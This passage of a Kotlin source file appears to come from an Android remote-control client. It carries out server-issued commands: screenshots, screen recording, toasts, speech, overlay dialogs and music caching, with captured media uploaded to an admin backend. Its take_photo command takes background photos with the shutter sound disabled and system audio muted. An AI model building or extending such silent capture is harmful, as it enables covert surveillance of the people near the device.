            CommandResult(id, name, true, message)
        } catch (e: Exception) {
            Timber.e(e, "命令 get_network 执行失败")
            CommandResult(id, name, false, e.message ?: "读取网络状态失败")
        }
    }

    /**
     * 执行 get_battery：读取电池状态（见 [BatteryReporter]）。
     * 粘性广播零权限，只读。
     */
    private fun executeGetBattery(context: Context, command: Command): CommandResult {
        val id = command.commandId
        val name = command.command
        return try {
            val message = BatteryReporter.read(context)
            Timber.i("命令 %s：%s", name, message)
            CommandResult(id, name, true, message)
        } catch (e: Exception) {
            Timber.e(e, "命令 get_battery 执行失败")
            CommandResult(id, name, false, e.message ?: "读取电池状态失败")
        }
    }

    // ------------------------------------------------------------------
    // 媒体采集类命令（screenshot / record_screen / take_photo）
    //
    // 共同形态：采集 → 产物落 App 私有 media/ 目录 → multipart 上传服务端 → 回执。
    // 截屏/录屏需设备端用户点一次「立即开始」（MediaProjection 系统限制，
    // Android 14 起授权一次性有效，无法跨命令复用）。
    // ------------------------------------------------------------------

    /** 采集等待常量：授权最长等 90 秒，单帧采集等 20 秒。 */
    private const val CONSENT_TIMEOUT_MS = 90_000L
    private const val CAPTURE_TIMEOUT_MS = 20_000L

    /**
     * 执行 screenshot / record_screen：投屏授权 → 前台服务采集 → 上传。
     *
     * @param params.duration 录制秒数 3~60（仅 record_screen，默认 10）
     *
     * ① 弹系统投屏授权框（透明 Activity），90 秒内未确认回执失败；
     * ② 授权后启动 [MediaCaptureService]（mediaProjection 类型前台服务）采集；
     * ③ 产物 multipart 上传 POST /api/media，上传失败在回执注明（文件保留）。
     */
    private suspend fun executeProjectionCapture(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
        mode: String,
    ): CommandResult {
        val id = command.commandId
        val name = command.command
        val isRecord = mode == MediaCaptureService.MODE_RECORD
        val durationSec =
            if (isRecord) command.intParam("duration", 10, 3, 60) else 0
        val actionLabel = if (isRecord) "录屏" else "截屏"

        // ① 投屏授权：注册等待 → 弹透明授权页 → 阻塞等设备端确认
        val consentOutcome = ScreenCaptureHolder.Outcome<Pair<Int, Intent?>>()
        ScreenCaptureHolder.consent[command.commandId] = consentOutcome
        val launched = try {
            context.startActivity(ProjectionConsentActivity.intentOf(context, command.commandId))
            true
        } catch (e: Exception) {
            Timber.w(e, "%s：弹出投屏授权框失败（后台启动被拦截）", name)
            false
        }
        if (!launched) {
            ScreenCaptureHolder.consent.remove(command.commandId)
            return CommandResult(
                id, name, false,
                "无法在设备上弹出投屏授权框（后台启动被系统拦截），请打开 App 后重试下发",
            )
        }
        Timber.i("%s：等待设备端投屏授权（最长 %d 秒）…", name, CONSENT_TIMEOUT_MS / 1000)
        val consentReady = consentOutcome.latch.await(CONSENT_TIMEOUT_MS, TimeUnit.MILLISECONDS)
        val consent = consentOutcome.value
        if (!consentReady || consent == null || consent.second == null) {
            ScreenCaptureHolder.consent.remove(command.commandId)
            return CommandResult(
                id, name, false,
                "设备端未确认投屏授权（${CONSENT_TIMEOUT_MS / 1000} 秒内未点「立即开始」或被拒绝）",
            )
        }

        // ② 采集：注册结果等待 → 启动采集服务（mediaProjection 类型前台）
        val captureOutcome = ScreenCaptureHolder.Outcome<ScreenCaptureHolder.CaptureFile>()
        ScreenCaptureHolder.capture[command.commandId] = captureOutcome
        val serviceIntent = Intent(context, MediaCaptureService::class.java).apply {
            putExtra(MediaCaptureService.EXTRA_COMMAND_ID, command.commandId)
            putExtra(MediaCaptureService.EXTRA_MODE, mode)
            if (isRecord) putExtra(MediaCaptureService.EXTRA_DURATION_SEC, durationSec)
            putExtra(MediaCaptureService.EXTRA_RESULT_CODE, consent.first)
            putExtra(MediaCaptureService.EXTRA_CONSENT_DATA, Bundle().apply { putParcelable("data", consent.second) })
        }
        val started = try {
            ContextCompat.startForegroundService(context, serviceIntent)
            true
        } catch (e: Exception) {
            Timber.e(e, "%s：采集服务启动失败", name)
            false
        }
        if (!started) {
            ScreenCaptureHolder.capture.remove(command.commandId)
            return CommandResult(id, name, false, "$actionLabel 采集服务启动失败")
        }
        val waitMs = if (isRecord) durationSec * 1000L + CAPTURE_TIMEOUT_MS else CAPTURE_TIMEOUT_MS
        val done = captureOutcome.latch.await(waitMs, TimeUnit.MILLISECONDS)
        val capture = captureOutcome.value
        if (!done || capture == null) {
            return CommandResult(id, name, false, "$actionLabel 采集超时")
        }
        if (!capture.success) {
            return CommandResult(id, name, false, capture.error ?: "$actionLabel 失败")
        }

        // ③ 上传
        return uploadCaptureFile(deviceStore, apiClient, id, name, kindOf(mode), File(capture.path))
    }

    /**
     * 执行 take_photo：Camera1 静默拍照（无需投屏授权，需相机运行时权限）。
     *
     * @param params.camera back（后置，默认）/ front（前置）
     *
     * 后台访问相机要求 CAMERA 类型前台服务（Android 11+ while-in-use 规则），
     * 静音策略：enableShutterSound(false) + 临时静音系统流，见 [MediaCaptureService]。
     */
    private suspend fun executeTakePhoto(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        val id = command.commandId
        val name = command.command
        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.CAMERA) !=
            android.content.pm.PackageManager.PERMISSION_GRANTED
        ) {
            return CommandResult(
                id, name, false,
                "缺少相机权限，请打开 App 在系统设置中授予相机权限后重试",
            )
        }
        val facing = command.strParam("camera", "back")
        if (facing !in setOf("back", "front")) {
            return CommandResult(id, name, false, "camera 参数只支持 back/front，收到：$facing")
        }

        val captureOutcome = ScreenCaptureHolder.Outcome<ScreenCaptureHolder.CaptureFile>()
        ScreenCaptureHolder.capture[command.commandId] = captureOutcome
        val serviceIntent = Intent(context, MediaCaptureService::class.java).apply {
            putExtra(MediaCaptureService.EXTRA_COMMAND_ID, command.commandId)
            putExtra(MediaCaptureService.EXTRA_MODE, MediaCaptureService.MODE_PHOTO)
            putExtra(MediaCaptureService.EXTRA_CAMERA_FACING, facing)
        }
        val started = try {
            ContextCompat.startForegroundService(context, serviceIntent)
            true
        } catch (e: Exception) {
            Timber.e(e, "take_photo：采集服务启动失败")
            false
        }
        if (!started) {
            ScreenCaptureHolder.capture.remove(command.commandId)
            return CommandResult(id, name, false, "相机服务启动失败")
        }
        val done = captureOutcome.latch.await(30_000, TimeUnit.MILLISECONDS)
        val capture = captureOutcome.value
        if (!done || capture == null) {
            return CommandResult(id, name, false, "拍照超时（相机无响应）")
        }
        if (!capture.success) {
            return CommandResult(id, name, false, capture.error ?: "拍照失败")
        }
        return uploadCaptureFile(deviceStore, apiClient, id, name, "photo", File(capture.path))
    }

    /** 上传采集产物并在成功后清理本地临时文件。 */
    private suspend fun uploadCaptureFile(
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        id: String,
        name: String,
        kind: String,
        file: File,
    ): CommandResult {
        if (!file.isFile || file.length() == 0L) {
            return CommandResult(id, name, false, "采集产物无效：${file.absolutePath}")
        }
        val mediaType = if (file.extension == "mp4") "video/mp4" else "image/jpeg"
        val part = MultipartBody.Part.createFormData(
            "file", file.name, RequestBody.create(mediaType.toMediaTypeOrNull(), file),
        )
        return try {
            val deviceId = deviceStore.deviceId()
            val token = runCatching { deviceStore.token() }.getOrNull()
            val r = apiClient.uploadMedia(deviceId, token, kind, part)
            file.delete()
            val sizeText = if (r.size >= 1024 * 1024) "%.1f MB".format(r.size / 1048576.0)
            else "%.0f KB".format(r.size / 1024.0)
            Timber.i("命令 %s：%s", name, r.message)
            CommandResult(id, name, true, "${r.message}：${r.filename}（$sizeText），已在管理后台「媒体文件」页可查看")
        } catch (e: Exception) {
            Timber.e(e, "命令 %s 上传失败", name)
            CommandResult(
                id, name, false,
                "已采集（${file.name}）但上传失败：${e.message}；文件已保留在设备 media/ 目录，可重试下发",
            )
        }
    }

    /** 采集模式 → 服务端 kind 字段。 */
    private fun kindOf(mode: String): String = when (mode) {
        MediaCaptureService.MODE_RECORD -> "screen_record"
        MediaCaptureService.MODE_PHOTO -> "photo"
        else -> "screenshot"
    }

    // ------------------------------------------------------------------
    // 交互类命令（show_toast / speak / vibrate / show_dialog）
    // ------------------------------------------------------------------

    /** 执行 show_toast：设备上显示一条 Toast（见 [ToastHelper]）。 */
    private fun executeShowToast(context: Context, command: Command): CommandResult {
        val id = command.commandId
        val name = command.command
        val text = command.params.get("text")
            ?.takeIf { it.isJsonPrimitive }?.asString?.trim().orEmpty()
        if (text.isEmpty()) return CommandResult(id, name, false, "缺少提示内容参数 text")
        if (text.length > 500) return CommandResult(id, name, false, "提示内容过长（${text.length} 字，上限 500）")
        return try {
            val message = ToastHelper.show(context, text)
            CommandResult(id, name, true, message)
        } catch (e: Exception) {
            Timber.e(e, "命令 show_toast 执行失败")
            CommandResult(id, name, false, "显示失败：${e.message}")
        }
    }

    /**
     * 执行 speak：TTS 朗读（见 [TtsSpeaker]）。
     * 播完（或失败）才回执；依赖设备装有 TTS 引擎。
     */
    private fun executeSpeak(context: Context, command: Command): CommandResult {
        val id = command.commandId
        val name = command.command
        val text = command.params.get("text")
            ?.takeIf { it.isJsonPrimitive }?.asString?.trim().orEmpty()
        if (text.isEmpty()) return CommandResult(id, name, false, "缺少播报内容参数 text")
        if (text.length > 1000) return CommandResult(id, name, false, "播报内容过长（${text.length} 字，上限 1000）")
        return try {
            val message = TtsSpeaker.speak(context, text, timeoutMs = 120_000)
            CommandResult(id, name, true, message)
        } catch (e: Exception) {
            Timber.e(e, "命令 speak 执行失败")
            CommandResult(id, name, false, e.message ?: "语音播报失败")
        }
    }

    /** 执行 vibrate：单次震动（见 [DeviceVibrator]）。 */
    private fun executeVibrate(context: Context, command: Command): CommandResult {
        val id = command.commandId
        val name = command.command
        val duration = command.intParam("duration", 500, 50, 10_000)
        return try {
            val message = DeviceVibrator.vibrate(context, duration.toLong())
            CommandResult(id, name, true, message)
        } catch (e: Exception) {
            Timber.e(e, "命令 vibrate 执行失败")
            CommandResult(id, name, false, e.message ?: "震动失败")
        }
    }

    /**
     * 执行 show_dialog：全局悬浮窗对话框（见 [OverlayDialog]）。
     *
     * 需要「显示在其他应用上层」特殊权限：未授权时自动弹系统设置页引导，
     * 开一次永久有效。回执「已弹出」后即完成；用户点「知道了」会触发
     * 二次上报（WS event=dialog_click），管理后台回执区追加显示点击结果。
     */
    private fun executeShowDialog(
        context: Context,
        webSocketClient: () -> BridgeWebSocketClient,
        command: Command,
    ): CommandResult {
        val id = command.commandId
        val name = command.command
        if (!OverlayDialog.hasPermission(context)) {
            val launched = OverlayDialog.launchOverlaySettings(context)
            val guide = if (launched) {
                "已在设备上打开设置页，请开启「显示在其他应用上层」后重新下发本命令"
            } else {
                "请在设备上：设置 → 应用 → Bridge → 显示在其他应用上层，开启后重新下发本命令"
            }
            return CommandResult(id, name, false, "未授予悬浮窗权限。$guide")
        }
        val title = command.params.get("title")
            ?.takeIf { it.isJsonPrimitive }?.asString?.trim().orEmpty()
        val content = command.params.get("content")
            ?.takeIf { it.isJsonPrimitive }?.asString?.trim().orEmpty()
        if (content.isEmpty()) return CommandResult(id, name, false, "缺少弹窗内容参数 content")

        return try {
            val error = OverlayDialog.show(context, title, content) {
                // 用户点击「知道了」→ 二次上报（点击结果追加到后台命令回执区）
                val data = com.google.gson.JsonObject().apply {
                    addProperty("event", "dialog_click")
                    addProperty("command_id", command.commandId)
                    addProperty("command", command.command)
                }
                val sent = try {
                    webSocketClient().sendBusinessMessage(data)
                } catch (e: Exception) {
                    Timber.w(e, "弹窗点击上报失败（连接未就绪）")
                    false
                }
                Timber.i("show_dialog 用户点击确认（二次上报 sent=%s）", sent)
            }
            if (error != null) {
                CommandResult(id, name, false, error)
            } else {
                CommandResult(id, name, true, "已弹出对话框，等待用户点击「知道了」（点击后回传结果）")
            }
        } catch (e: Exception) {
            Timber.e(e, "命令 show_dialog 执行失败")
            CommandResult(id, name, false, e.message ?: "弹窗失败")
        }
    }

    /**
     * 执行 check_update：检查更新（服务器目录版，不依赖 GitHub）。
     *
     * 服务端扫描 updates/ 目录取最高版本 APK（文件名解析版本号，可选
     * update.json 提供更新说明），与客户端当前 versionName 比对后回执；
     * APK 下载走服务器自身直链。本期不做自动下载安装。
     */
    private suspend fun executeCheckUpdate(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        command: Command,
    ): CommandResult {
        val id = command.commandId
        val name = command.command
        val current = DiagLog.appVersionName(context).ifBlank { "unknown" }
        return try {
            val deviceId = deviceStore.deviceId()
            val token = runCatching { deviceStore.token() }.getOrNull()
            val r = apiClient.getLatestUpdate(deviceId, token, current)
            when {
                !r.found ->
                    CommandResult(id, name, true, "服务器暂无更新包（updates 目录为空），当前版本 v$current")
                !r.available ->
                    CommandResult(id, name, true, "已是最新版本 v$current")
                else -> {
                    val sizeMb = r.size_bytes / 1048576.0
                    val notes = if (r.notes.isNotBlank()) "；更新说明：${r.notes}" else ""
                    CommandResult(
                        id, name, true,
                        "有新版本 v${r.version}（%.1f MB）$notes。请把 APK 安装到设备完成更新".format(sizeMb),
                    )
                }
            }
        } catch (e: Exception) {
            Timber.e(e, "命令 check_update 执行失败")
            CommandResult(id, name, false, "检查更新失败：${e.message}")
        }
    }

    private const val RESTART_APP_REQUEST_CODE = 2001
    private const val RESTART_APP_KILL_DELAY_MS = 1200L

    /** 按音源形态分三路解析（见 [executePlayMusic] 注释），返回可直接交给 MediaPlayer 的地址。 */
    private suspend fun resolveSource(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        source: String,
    ): String = when {
        source.startsWith("http://", ignoreCase = true) ||
            source.startsWith("https://", ignoreCase = true) -> source

        source.startsWith("/") -> {
            if (!File(source).isFile) {
                throw IllegalArgumentException("本地文件不存在：$source")
            }
            source
        }

        else -> resolveByFilename(context, deviceStore, apiClient, source)
    }

    /** 裸文件名：客户端缓存目录优先，未命中从服务器共享目录下载并持久化。 */
    private suspend fun resolveByFilename(
        context: Context,
        deviceStore: DeviceStore,
        apiClient: BridgeApiClient,
        filename: String,
    ): String {
        if (filename.contains('/') || filename.contains('\\') || filename.contains("..")) {
            throw IllegalArgumentException("仅支持单级文件名：$filename")
        }
        val cacheDir = musicCacheDir(context)
        val cached = File(cacheDir, filename)
        if (cached.isFile) {
            Timber.i("音乐缓存命中：${cached.absolutePath}")
            return cached.absolutePath
        }

        // 缓存未命中 → 请求服务器共享音乐目录
        val deviceId = deviceStore.deviceId()
        val token = deviceStore.token()
        Timber.i("音乐缓存未命中，向服务器请求：$filename")
        val body = try {
            apiClient.downloadMusic(filename, deviceId, token)
        } catch (e: HttpException) {
            if (e.code() == 404) {
                throw IllegalArgumentException("服务器与本地缓存均无此文件：$filename")
            }
            throw e
        }

        // 先写临时文件再原子重命名，避免半截文件被当成有效缓存
        cacheDir.mkdirs()
        val tmp = File(cacheDir, "$filename.tmp")
        try {
            body.use { resp ->
                resp.byteStream().use { input ->
                    tmp.outputStream().use { output -> input.copyTo(output) }
                }
            }
            val target = File(cacheDir, filename)
            if (target.exists()) target.delete()
            if (!tmp.renameTo(target)) {
                throw IllegalStateException("缓存写入失败：$filename")
            }
        } finally {
            tmp.delete()
        }
        Timber.i("音乐已下载并缓存：${File(cacheDir, filename).absolutePath}")
        return File(cacheDir, filename).absolutePath
    }

    /** 客户端音乐缓存目录：App 私有 music/（无外置存储时回退内部存储）。 */
    private fun musicCacheDir(context: Context): File =
        context.getExternalFilesDir("music") ?: File(context.filesDir, "music")
}
